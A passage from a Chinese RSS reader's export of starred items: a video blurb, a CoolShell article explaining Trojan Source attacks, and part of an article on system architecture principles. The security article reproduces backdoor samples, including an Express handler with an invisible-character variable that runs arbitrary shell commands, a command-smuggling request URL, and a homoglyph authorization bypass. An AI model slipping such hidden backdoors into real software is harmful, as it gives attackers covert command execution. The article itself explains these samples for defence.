{
    "id": "user/black_desk/state/org.freshrss/starred",
    "title": "收藏文章列表",
    "author": "black_desk",
    "items": [
{
    "id": "https://www.bilibili.com/video/BV1Ut4y1b7MY",
    "timestampUsec": "1657644477278769",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "佛州铁轨旁的男子 | X调查",
    "author": ";X调查",
    "published": 1657621920,
    "updated": 1657621920,
    "alternate": [
        {
            "href": "https://www.bilibili.com/video/BV1Ut4y1b7MY",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "一名货运火车司驾驶着列车行驶在一片森林里，期间他发现铁轨旁躺着一位男子，司机见状后将此事报告给了警方，没想到之后牵扯出了一桩大案……<br><br><iframe src=\"https://player.bilibili.com/player.html?aid=983279399&amp;high_quality=1\" width=\"650\" height=\"477\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\" referrerpolicy=\"no-referrer\" sandbox=\"allow-scripts allow-same-origin\"></iframe><br><img src=\"http://i2.hdslb.com/bfs/archive/f199f46c849940fac1c2619de16c2e1bd13c125c.jpg\" referrerpolicy=\"no-referrer\">"
    },
    "origin": {
        "streamId": 9,
        "title": "X调查",
        "htmlUrl": "https://space.bilibili.com/339233162",
        "feedUrl": "https://rsshub.black-desk.cn/bilibili/user/video/339233162"
    }
},
{
    "id": "https://coolshell.cn/?p=21649",
    "timestampUsec": "1657644531898532",
    "categories": [
        "网络安全",
        "hacker",
        "Unicode",
        "木马",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "源代码特洛伊木马攻击",
    "author": ";陈皓",
    "published": 1637312520,
    "updated": 1637312520,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21649.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg\" alt=\"\" width=\"340\" height=\"270\">最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi-direction。术语通常缩写为“ <b>BiDi</b> ”或“ <b>bidi</b> ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg\" alt=\"\" width=\"640\" height=\"206\"></p>\n<p>早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过<a title=\"ISO/IEC 8859-6\" href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-6\">ISO/IEC 8859-6</a>和<a title=\"ISO/IEC 8859-8\" href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-8\">ISO/IEC 8859-8</a>等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。</p>\n<p><span></span></p>\n<p>双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。</p>\n<p>好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“<a href=\"https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/\" target=\"_blank\" rel=\"noopener\">关于双向Unicode的警告</a>”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。</p>\n<p>我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。</p>\n<pre data-enlighter-language=\"golang\">package main\n\nimport \"fmt\"\n\nfunc main() {\n  str, mask := \"Hello, World!‮10x‭\", 0\n\n  bits := 0\n  for _, ch := range str {\n    for ch &gt; 0 {\n      bits += int(ch) &amp; mask\n      ch = ch &gt;&gt; 1\n    }\n  }\n  fmt.Println(\"Total bits set:\", bits)\n}</pre>\n<p>这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行  –<a href=\"https://play.golang.org/p/e2BDZvFlet0\" target=\"_blank\" rel=\"noopener\"> https://play.golang.org/p/e2BDZvFlet0</a>），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？</p>\n<p>如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg\" alt=\"\" width=\"500\" height=\"324\"></p>\n<p>其中有两个浅蓝色的尖括号的东西—— <code>&lt;202e&gt;</code> 和 <code>&lt;202d&gt;</code> 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 <a href=\"https://www.compart.com/en/unicode/bidiclass\" target=\"_blank\" rel=\"noopener\">Unicode Bidirectional Classes</a>）：</p>\n<ul>\n<li><strong>U+202E – Right-to-Left Override [RLO] </strong><br>\n表示，开始从右到左显示，于是，接下来的文本 <code>10x\", 0</code> 变成了 <code>0 ,\"x01</code></li>\n<li><strong>U+202D – Left-to-Right Override [LRO]</strong><br>\n表示，开始从左到右显示，于是，<code>0,\"x01</code> 中的前4个字符<code>0 ,\"</code> 反转成  <code>\", 0</code>，于是整个文本成了 <code>\", 0x01</code></li>\n</ul>\n<p>所以，你在视觉上看到的是结果是—— <code>\"Hello, World!”, 0x01</code>， 但是实际上是完全是另外一码事。</p>\n<p>然后，Github官方博客中还给了一个安全问题 <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574\">CVE-2021-42574</a> ——</p>\n<blockquote><p>在 Unicode 规范到 14.0 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。</p></blockquote>\n<p>这个安全问题在剑桥大学的这篇论文“<a href=\"https://www.trojansource.codes/\" target=\"_blank\" rel=\"noopener\">Some Vulnerabilities are Invisible</a>”中有详细的描述。其中PDF版的文章中也给了这么一个示例：</p>\n<p>通过双向文本可以把下面这段代码：</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg\" alt=\"\" width=\"569\" height=\"240\"></p>\n<p>伪装成下面的这个样子：</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg\" alt=\"\" width=\"580\" height=\"245\"></p>\n<p>在图 2 中<code>'alice'</code>被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。</p>\n<p>然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入<strong>RLI (Right To Left Isolate)</strong><i> – </i><strong>U+2067</strong><i>，</i>我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。</p>\n<p>除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“<a href=\"https://certitude.consulting/blog/en/invisible-backdoor/\" target=\"_blank\" rel=\"noopener\">The Invisible Javascript Backdoor</a>”里的这个示例：</p>\n<pre data-enlighter-language=\"js\">const express = require('express');\nconst util = require('util');\nconst exec = util.promisify(require('child_process').exec);\n\nconst app = express();\n\napp.get('/network_health', async (req, res) =&gt; {\n    const { timeout,ㅤ} = req.query;\n    const checkCommands = [\n        'ping -c 1 google.com',\n        'curl -s http://example.com/',ㅤ\n    ];\n\n    try {\n        await Promise.all(checkCommands.map(cmd =&gt; \n                cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 })));\n        res.status(200);\n        res.send('ok');\n    } catch(e) {\n        res.status(500);\n        res.send('failed');\n    }\n});\n\napp.listen(8080);</pre>\n<p>上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 <code>ping -c 1 google.com</code> 以及 <code>curl -s http://example.com</code> 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数<code>timeout</code>限制命令执行时间。</p>\n<p>然后，上面这个代码是有不可见的Unicode 字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg\" alt=\"\" width=\"640\" height=\"577\"></p>\n<p>于是，一个你看不见的 <code>πàñ</code> 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：</p>\n<p><strong>http://host:port/network_health?%E3%85%A4=&lt;any command&gt;</strong></p>\n<p>其中的，%E3%85%A4 就是 <code>\\u3164</code> 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。</p>\n<p>另外，还可以使用“同形字符”，看看下面这个示例：</p>\n<pre data-enlighter-language=\"c\">if(environmentǃ=ENV_PROD){\n    // bypass authZ checks in DEV\n    return true;\n}</pre>\n<p>如何你以为 <code>ǃ</code> 是 惊叹号，其实不是，它是一个Unicode <code>╟â</code>。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。</p>\n<p>现在，是时候检查一下你的代码有没有上述的这些情况了……</p>\n<p>（全文完）</p>\n<p> </p>\n<p> </p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/3684.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg\" alt=\"Web开发人员速查卡\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/3684.html\">Web开发人员速查卡</a></li><li><a href=\"https://coolshell.cn/articles/2439.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/16.jpg\" alt=\"黑客的价值观\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/2439.html\">黑客的价值观</a></li><li><a href=\"https://coolshell.cn/articles/1957.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg\" alt=\"Web程序的最佳测试数据\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/1957.html\">Web程序的最佳测试数据</a></li><li><a href=\"https://coolshell.cn/articles/1331.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/11.jpg\" alt=\"Unicode字符预览表\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/1331.html\">Unicode字符预览表</a></li><li><a href=\"https://coolshell.cn/articles/1835.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/28.jpg\" alt=\"IE6/IE7 0day 漏洞\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/1835.html\">IE6/IE7 0day 漏洞</a></li><li><a href=\"https://coolshell.cn/articles/3672.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2011/02/reasons_why_people_who_work_with_computers_seem_to_have_a_lot_of_spare_time-150x150.png\" alt=\"为啥搞电脑的会有这么多空闲时间？\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/3672.html\">为啥搞电脑的会有这么多空闲时间？</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21649.html\">源代码特洛伊木马攻击</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=21672",
    "timestampUsec": "1657644531898533",
    "categories": [
        "程序设计",
        "系统架构",
        "Architecture",
        "Design",
        "程序员",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "我做系统架构的一些原则",
    "author": ";陈皓",
    "published": 1640072760,
    "updated": 1640072760,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21672.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/12/bachelor-mechanical-eng-icon@72x.png\" alt=\"\" width=\"250\" height=\"250\">工作 20 多年了，这 20 来年看到了很多公司系统架构，也看到了很多问题，在跟这些公司进行交流和讨论的时候，包括进行实施和方案比较的时候，都有很多各种方案的比较和妥协，因为相关的经历越来越多，所以，逐渐形成了自己的逻辑和方法论。今天，想写下这篇文章，把我的这些个人的经验和想法总结下来，希望能够让更多的人可以参考和借鉴，并能够做出更好的架构来。另外，我的这些思维方式和原则都针对于现有市面上众多不合理的架构和方案，所以，也算是一种“纠正”……（注意，这篇文章所说的这些架构上的原则，一般适用于相对比较复杂的业务，如果只是一些简单和访问量不大的应用，那么你可能会得出相反的结论）</p>\n<h4>原则一：关注于真正的收益而不是技术本身</h4>\n<p>对于软件架构来说，我觉得第一重要的是架构的收益，如果不说收益，只是为了技术而技术，而没有任何意义。对于技术收益来说，我觉得下面这几个收益是非常重要的：</p>\n<ul>\n<li><strong>是否可以降低技术门槛加快整个团队的开发流程</strong>。能够加快整个团队的工程流程，快速发布，是软件工程一直在解决的问题，所以，系统架构需要能够进行并行开发，并行上线和并行运维，而不会让某个团队成为瓶颈点。（注：就算拖累团队的原因是组织构架，也不妨碍我们做出并行的系统架构设计）</li>\n<li><strong>是否可以让整个系统可以运行的更稳定</strong>。要让整个系统可以运行的更为的稳定，提升整个系统的 SLA，就需要对有计划和无计划的停机做相应的解决方案（参看《<a title=\"关于高可用的系统\" href=\"https://coolshell.cn/articles/17459.html\" target=\"_blank\" rel=\"noopener\">关于高可用的架构</a>》）</li>\n<li><strong>是否可以通过简化和自动化降低成本</strong>。最高优化的成本是人力成本，人的成本除了慢和贵，还有经常不断的 human error。如果不能降低人力成本，反而需要更多的人，那么这个架构设计一定是失败的。除此之外，是时间成本，资金成本。</li>\n</ul>\n<p>如果一个系统架构不能在上面三个事上起到作用，那就没有意义了。</p>\n<p><span></span></p>\n<h4>原则二：以应用服务和 API 为视角，而不是以资源和技术为视角</h4>\n<p>国内很多公司都会有很多分工，基本上都会分成运维和开发，运维又会分成基础运维和应用运维，开发则会分成基础核心开发和业务开发。不同的分工会导致完全不同的视角和出发点。比如，基础运维和开发的同学更多的只是关注资源的利用率和性能，而应用运维和业务开发则更多关注的是应用和服务上的东西。这两者本来相关无事，但是因为分布式架构的演进，导致有一些系统已经说不清楚是基础层的还是应用层的了，比如像服务治理上的东西，里面即有底层基础技术，也需要业务的同学来配合，包括 k8s 也样，里面即有底层的如网络这样的技术，也有需要业务配合的 readniess和 liveness 这样的健康检查，以及业务应用需要 configMap 等等 ……</p>\n<p><strong>这些东西都让我感觉到所谓 DevOps，其实就是因为很多技术和组件已经分不清是 Dev 还是 Ops 的了，所以，需要合并 Dev和 Ops</strong>。而且，整个组织和架构的优化，已经不能通过调优单一分工或是单一组件能够有很大提升的了。其需要有一种自顶向下的，整体规划，统一设计的方式，才能做到整体的提升（可以试想一下城市交通的优化，当城市规模到一定程度的时候，整体的性能你是无法通过优化几条路或是几条街区来完成的，你需要对整个城市做整体的功能体的规划才可能达到整体效率的提升）。而为了做到整体的提升，需要所有的人都要有一个统一的视角和目标，这几年来，我觉得这个目标就是——<strong>要站在服务和 对外API的视角来看问题，而不是技术和底层的角度。</strong></p>\n<h4>原则三：选择最主流和成熟的技术</h4>\n<p>技术选型是一件很重要的事，技术一旦选错，那会导致整个架构需要做调整，而对架构的调整重来都不是一件简单的事，我在过去几年内，当系统越来越复杂的时候，用户把他们的  PHP，Python, .NET，或 Node.js 的架构完全都迁移到 Java + Go 的架构上来的案例不断的发生。这个过程还是非常痛苦的，但是你没有办法，当你的系统越来越复杂，越来越大时，你就再也不能在一些玩具技术上玩了，你需要的更为工业化的技术。</p>\n<ul>\n<li><strong>尽可能的使用更为成熟更为工业化的技术栈，而不是自己熟悉的技术栈</strong>。 所谓工业化的技术栈，你可以看看大多数公司使用的技术栈，比如：互联网，金融，电信……等等 ，大公司会有更多的技术投入，也需要更大规模的生产，所以，他们使用的技术通常来说都是比较工业化的。在技术选型上，千万不要被——“你看某个视频公司也在用这个技术”，或是一些在论坛上看到的一些程序员吐槽技术的观点（没有任何的数据，只有自己的喜好）来决定自己的技术，还是看看主流大多数公司实际在用的技术栈，会更靠谱一些。</li>\n<li><strong>选择全球流行的技术，而不是中国流行的技术</strong>。技术这个东西一定是一个全球化的东西，不是一个局域化的事。所以，一定要选国际化的会更好。另外，千万不要被某些公司的“特别案例”骗过去了，那怕这个案例很性感，关键还是要看解决问题的思路和采用的技术是否具有普世性。只有普世性的技术有更强的生命力。</li>\n<li><strong>尽可能的使用红利大的主流技术，而不要自己发明轮子，更不要魔改</strong>。我见过好些个公司魔改开源软件，比如有个公司同魔改mesos，最后改着改着发现自己发明另一个 kubernetes。我还见过很多公司或技术团队喜欢自己发明自己的专用轮子，最后都会被主流开源软件所取代。完全没有必要。不重新发明轮子，不魔改，不是因为自己技术不能，而是因为，这个世界早已不是自己干所有事的年代了，这个时代是要想尽方法跟整个产业，整个技术社区融合和合作，这样才会有最大的收益。那些试图因为某个特例需要自成一套的玩法，短期没问题，但长期来说，我都不看好。</li>\n<li><strong>绝大多数情况下，如无非常特殊要求，选 Java基本是不会错的</strong>。一方面，这是因为 Java 的业务开发的生产力是非常好的，而且有 Spring 框架保障，代码很难写烂，另外，Java 的社区太成熟了，你需要的各种架构和技术都可以很容易获得，技术红利实在是太大。这种运行在JVM上的语言有太多太多的好处了。在 Java 的技术栈上，你的架构风险和架构的成本（无论是人力成本，时间成本和资金成本）从长期来说都是最优的</li>\n</ul>\n<p>在我见过的公司中，好些公司的架构都被技术负责人个人的喜好、擅长和个人经验给绑架了，完全不是从一个客观的角度来进行技术选型。其实，从 0 到 1 的阶段，你用什么样的技术都行，如果你做一个简单的应用，没有事务处理没有复杂的交易流程，比如一些论坛、社交之类的应用，你用任何语言都行。但是如果有一天你的系统变复杂了，需要处理交易了，量也上来了，从 1 到 10，甚至从 10 到 100，你的开发团队也变大了，需要构建的系统越来越大，你可能会发现你只有一个选择，就是 Java。想想京东从.NET 到 Java，淘宝从 PHP 到 Java……</p>\n<p>注，一些有主观喜好的人一定会对我上述对 Java 的描述感到不适，我还用一些证据说明一下——全中国所有的电商平台，几百家银行，三大电信运营商，所有的保险公司，劵商的系统，医院里的系统，电子政府系统，等等，基本都是用 Java 开发的，包括 AWS 的主流语言也是 Java，阿里云一开始用 C++/Python 写控制系统，后面也开始用 Java ……你可能会说 B站是用 go语言，但是你可能不知道 B 站的电商和大数据是用 Java……懂着数据分析的同学，建议上各大招聘网站上搜一下 Java 的职位数量，你就知道某个技术是否主流和热门……</p>\n<h4>原则四：完备性会比性能更重要</h4>\n<p>我发现好些公司的架构师做架构的时候，首要考虑的是架构的性能是否能够撑得住多大多大的流量，而不是考虑系统的完备性和扩展性。所以，我已经多次见过这样的案例了，一开始直接使用 MongoDB 这样的非关系型数据库，或是把数据直接放在 Redis 里，而直接放弃关系型数据库的数据完备性的模型，而在后来需要在数据上进行关系查询的时候，发现 NoSQL 的数据库在 Join 上都表现的太差，然后就开始各种飞线，为了不做 Join 就开始冗余数据，然而自己又维护不好冗余数据后带来的数据一致性的问题，导致数据上的各种错乱丢失。</p>\n<p>所以，我给如下的一些如下的架构原则：</p>\n<ul>\n<li><strong>使用最科学严谨的技术模型为主，并以不严谨的模型作为补充</strong>。对于上面那个案例来说，就是——永远使用完备支持 ACID 的关系型数据库，然后用 NoSQL 作补充，而不是完全放弃关系型数据库。这里的原则就是所谓的“先紧后松”，一开始紧了，你可以慢慢松，但是开始松了，以后你想紧再也紧不过来了。</li>\n<li><strong>性能上的东西，总是有很多解的</strong>。我这么多年的经历告诉我，性能上的事，总是有解的，手段也是最多的，这个比起架构的完备性和扩展性来说真的不必太过担心。</li>\n</ul>\n<p>为了追求所谓的性能，把整个系统的完备性丢失掉，相当地得不偿失。</p>\n<h4>原则五：制定并遵循服从标准、规范和最佳实践</h4>\n<p>这个原则是非常重要的，因为只有服从了标准，你的架构才能够有更好的扩展性。比如：我经常性的见到很多公司的系统既没有服从业界标准，也没有形成自己公司的标准，感觉就像一群乌合之众一样。最典型的例子就是 HTTP 调用的状态返回码。业内给你的标准是 200表示成功，3xx 跳转，4xx 表示调用端出错，5xx 表示服务端出错，我实在是不明白为什么无论成功和失败大家都喜欢返回 200，然后在 body 里指出是否error（前两年我在微信公众号里看到一个有一定名气的互联网老兵推荐使用无论正确还是出错都返回 200 的做法，我在后台再三确认后，我发现这样的架构师真是害人不浅）。这样做最大的问题是——监控系统将在一种低效的状态下工作。监控系统需要把所有的网络请求包打开后才知道是否是错误，而且完全不知道是调用端出错还是服务端出错，于是一些像重试或熔断这样的控制系统完全不知道怎么搞（如果是 4xx错，那么重试或熔断是没有意义的，只有 5xx 才有意义）。<strong>有时候，我会有种越活越退步的感觉，错误码设计这种最基本最基础的东西为什么会没有？并且一个公司会任由着大家乱来？这些基础技能怎么就这样丢掉了？</strong></p>\n<p>还有，我还见过一些公司，他们整个组织没有一个统一的用户 ID 的设计，各个系统之间同步用户的数据是通过用户的身份证 ID，是的，就是现实世界的身份证 ID，包括在网关上设置的用户白名单居然也是用身份证 ID。我对这个公司的内的用户隐私管理有很大的担忧。一个企业，一个组织，如果没有标准和规范，也就会有抽象，这一定是要出各种乱子的。</p>\n<p>下面，我罗列一些你需要注意的标准和规范（包括但不限于）：</p>\n<ul>\n<li><strong>服务间调用的协议标准和规范</strong>。这其中包括 Restful API路径, HTTP 方法、状态码、标准头、自定义头等，返回数据 JSon Scheme……等。</li>\n<li><strong>一些命名的标准和规范</strong>。这其中包括如：用户 ID，服务名、标签名、状态名、错误码、消息、数据库……等等</li>\n<li><strong>日志和监控的规范</strong>。这其中包括：日志格式，监控数据，采样要求，报警……等等</li>\n<li><strong>配置上的规范</strong>。这其中包括：操作系统配置、中间件配置，软件包……等等</li>\n<li><strong>中间件使用的规范</strong>。数据库，缓存、消息队列……等等</li>\n<li><strong>软件和开发库版本统一</strong>。整个组织架构内，软件或开发库的版本最好每年都升一次级，然后在各团队内统一。</li>\n</ul>\n<p>这里重要说一下两个事：</p>\n<ul>\n<li><strong>Restful API 的规范</strong>。我觉得是非常重要的，这里给两个我觉得写得最好的参考：<a href=\"https://github.com/paypal/api-standards/blob/master/api-style-guide.md\" target=\"_blank\" rel=\"noopener\">Paypal</a> 和 <a href=\"https://github.com/microsoft/api-guidelines\" target=\"_blank\" rel=\"noopener\">Microsoft</a> 。Restful API 有一个标准和规范最大的好处就是监视可以很容易地做各种统计分析，控制系统可以很容易的做流量编排和调度。</li>\n<li><strong>另一个是服务调用链追踪</strong>。对于服务调用链追踪来说，基本上都是参考于 <a href=\"https://research.google/pubs/pub36356/\" target=\"_blank\" rel=\"noopener\">Google Dapper</a> 这篇论文，目前有很多的实现，最严格的实现是 <a href=\"https://zipkin.io/\" target=\"_blank\" rel=\"noopener\">Zipkin</a>，这也是 Spring Cloud Sleuth 的底层实现。Zipkin 贴近 Google Dapper 论文的好处在于——无状态，快速地把 Span 发出来，不消耗服务应用侧的内存和 CPU。这意味着，监控系统宁可自己死了也不能干扰实际应用。</li>\n<li><strong>软件升级</strong>。我发现很多公司包括 BAT，他们完全没有软件升级的活动，全靠开发人员自发。然而，这种成体系的活动，是永远不可能靠大众的自发形成的。一个公司至少一年要有一次软件版本升级的review，然后形成软件版本的统一和一致，这样会极太简化系统架构的复杂度。</li>\n</ul>\n<h4>原则六：重视架构扩展性和可运维性</h4>\n<p>在我见过很多架构里，技术人员只考虑当下，但从来不考虑系统的未来扩展性和可运维性。所谓的管生不管养。如果你生下来的孩子胳膊少腿，严重畸形，那么未来是很难玩的。因为架构和软件不是写好就完的，是需要不断修改不断维护的，80%的软件成本都是在维护上。所以，如何让你的架构有更好的扩展性，可以更容易地运维，这个是比较重要的。所谓的扩展性，意味着，我可以很容易地加更多的功能，或是加入更多的系统，而所谓可运维，就是说我可以对线上的系统做任意的变更。扩展性要求的是有标准规范且不耦合的业务架构，可运维性要求的则是可控的能力，也就是一组各式各样的控制系统。</p>\n<ul>\n<li><strong>通过服务编排架构来降低服务间的耦合</strong>。比如：通过一个业务流程的专用服务，或是像 Workflow，Event Driven Architecture ， Broker，Gateway，Service Discovery 等这类的的中间件来降低服务间的依赖关系。</li>\n<li><strong>通过服务发现或服务网关来降低服务依赖所带来的运维复杂度</strong>。服务发现可以很好的降低相关依赖服务的运维复杂度，让你可以很轻松的上线或下线服务，或是进行服务伸缩。</li>\n<li><strong>一定要使用各种软件设计的原则</strong>。比如：像SOLID这样的原则（参看《<a title=\"一些软件设计的原则\" href=\"https://coolshell.cn/articles/4535.html\">一些软件设计的原则</a>》），IoC/DIP，SOA 或 Spring Cloud 等 架构的最佳实践（参看《<a title=\"SteveY对Amazon和Google平台的吐槽 - 67,710 人阅读\" href=\"https://coolshell.cn/articles/5701.html\" target=\"_blank\" rel=\"noopener\">SteveY对Amazon和Google平台的吐槽</a>》中的 Service Interface 的那几条军规），分布式系统架构的相关实践（参看：《<a title=\"分布式系统的事务处理\" href=\"https://coolshell.cn/articles/10910.html\" target=\"_blank\" rel=\"noopener\">分布式系统的事务处理</a>》，或微软件的 《<a href=\"https://docs.microsoft.com/en-us/azure/architecture/patterns/\" target=\"_blank\" rel=\"noopener\">Cloud Design Patterns</a>》）……等等</li>\n</ul>\n<h4>原则七：对控制逻辑进行全面收口</h4>\n<p>所有的程序都会有两种逻辑，一种是业务逻辑，一种是控制逻辑，业务逻辑就是完成业务的逻辑，控制逻辑是辅助，比如你用多线程，还是用分布式，是用数据库还是用文件，如何配置、部署，运维、监控，事务控制，服务发现，弹性伸缩，灰度发布，高并发，等等，等等 ……这些都是控制逻辑，跟业务逻辑没有一毛钱关系。控制逻辑的技术深度会通常会比业务逻辑要深一些，门槛也会要高一些，所以，最好要专业的程序员来负责控制逻辑的开发，统一规划统一管理，进行收口。这其中包括：</p>\n<ul>\n<li><strong>流量收口</strong>。包括南北向和东西向的流量的调度，主要通过流量网关，开发框架 SDK或 Service Mesh 这样的技术。</li>\n<li><strong>服务治理收口</strong>。包括：服务发现、健康检查，配置管理、事务、事件、重试、熔断、限流……主要通过开发框架 SDK – 如：Spring Cloud，或服务网格Service Mesh等技术。</li>\n<li><strong>监控数据收口</strong>。包括：日志、指标、调用链……主要通过一些标准主流的探针，再加上后台的数据清洗和数据存储来完成，最好是使用无侵入式的技术。监控的数据必须统一在一个地方进行关联，这样才会产生信息。</li>\n<li><strong>资源调度有应用部署的收口</strong>。包括：计算、网络和存储的收口，主要是通过容器化的方案，如k8s来完成。</li>\n<li><strong>中间件的收口</strong>。包括：数据库，消息，缓存，服务发现，网关……等等。这类的收口方式一般要在企业内部统一建立一个共享的云化的中间件资源池。</li>\n</ul>\n<p>对此，这里的原则是：</p>\n<ul>\n<li><strong>你要选择容易进行业务逻辑和控制逻辑分离的技术</strong>。这里，Java 的 JVM+字节码注入+AOP 式的Spring 开发框架，会带给你太多的优势。</li>\n<li><strong>你要选择可以享受“前人种树，后人乘凉”的有技术红利的技术</strong>。如：有庞大社区而且相互兼容的技术，如：Java, Docker,  Ansible，HTTP，Telegraf/Collectd……</li>\n<li><strong>中间件你要使用可以 支持HA集群和多租户的技术</strong>。这里基本上所有的主流中间件都会支持 HA 集群方式的。</li>\n</ul>\n<h4>原则八：不要迁就老旧系统的技术债务</h4>\n<p>我发现很多公司都很非常大的技术债务，这些债务具体表现如下：</p>\n<ul>\n<li><strong>使用老旧的技术</strong>。比如，使用HTTP1.0， Java 1.6，Websphere，ESB，基于 socket的通讯协议，过时的模型……等等</li>\n<li><strong>不合理的设计</strong>。比如，在 gateway 中写大量的业务逻辑，单体架构，数据和业务逻辑深度耦合，错误的系统架构（把缓存当数据库，用消息队列同步数据）……等等</li>\n<li> <strong>缺少配套设施</strong>。比如，没有自动化测试，没有好的软件文档，没有质量好的代码，没有标准和规范……等等</li>\n</ul>\n<p>来找我寻求技术帮助的人都有各种各样的问题。我都会对他们苦口婆心地说同样的一句话——“<strong>如果你是来找我 case-by-case 